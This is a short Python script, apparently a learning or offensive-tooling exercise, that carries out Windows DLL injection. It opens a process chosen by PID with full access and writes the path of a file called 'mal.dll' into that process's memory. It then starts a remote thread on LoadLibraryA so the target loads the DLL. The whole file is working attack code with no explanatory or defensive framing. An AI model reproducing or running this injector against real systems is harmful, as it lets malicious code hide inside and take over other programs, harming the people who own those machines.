from ctypes import *
from ctypes.wintypes import *
from winStruct import *

#constant
kernel32 = windll.kernel32

PROCESS_ALL_ACCESS = 0x1F0FFF

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000

PAGE_READWRITE = 0x04

kernel32.OpenProcess.argtypes = (
    DWORD,
    BOOL,
    DWORD
)

kernel32.OpenProcess.restype = HANDLE


kernel32.VirtualAllocEx.argtypes = (
    HANDLE,
    LPVOID,
    c_size_t,
    DWORD,
    DWORD
)

kernel32.VirtualAllocEx.restype = LPVOID


kernel32.WriteProcessMemory.argtypes = (
    HANDLE,
    LPVOID,
    LPCVOID,
    c_size_t,
    POINTER(c_size_t)
)

kernel32.WriteProcessMemory.restype = BOOL


kernel32.GetModuleHandleA.argtypes = [LPCSTR]
kernel32.GetModuleHandleA.restype = HMODULE


kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
kernel32.GetProcAddress.restype = LPVOID


LPTHREAD_START_ROUTINE = c_void_p

kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,
    wintypes.LPVOID,
    c_size_t,
    LPTHREAD_START_ROUTINE,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.LPDWORD
]

kernel32.CreateRemoteThread.restype = wintypes.HANDLE
pid = int(input("PID: "))

NoteprocHandle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
print(f"[+] Process Handle acquired: {NoteprocHandle}")

import os

dll_full_path = os.path.abspath("mal.dll")
dll_path = dll_full_path.encode() + b"\x00"
inj = kernel32.VirtualAllocEx(NoteprocHandle,0, len(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
print(f"[+] Remote Address: {hex(inj)}")
written = c_size_t(0)
s =  kernel32.WriteProcessMemory(NoteprocHandle, inj, dll_path, len(dll_path),byref(written))

if s == False:
	print("OOpsie! didn't work")
print(f"[+] Bytes Written: {written.value}")

kernel32_module = kernel32.GetModuleHandleA(
    b"kernel32.dll"
)

print(f"[+] kernel32 Base : {hex(kernel32_module)}")
load_library_addr = kernel32.GetProcAddress(kernel32_module,b"LoadLibraryA")

print(f"[+] LoadLibraryA : {hex(load_library_addr)}")

thread_handle = kernel32.CreateRemoteThread(NoteprocHandle, None, 0, load_library_addr,inj,0,None)

print(f"[+] Thread Handle : {thread_handle}")

print("\n[+] DLL Injected Successfully")
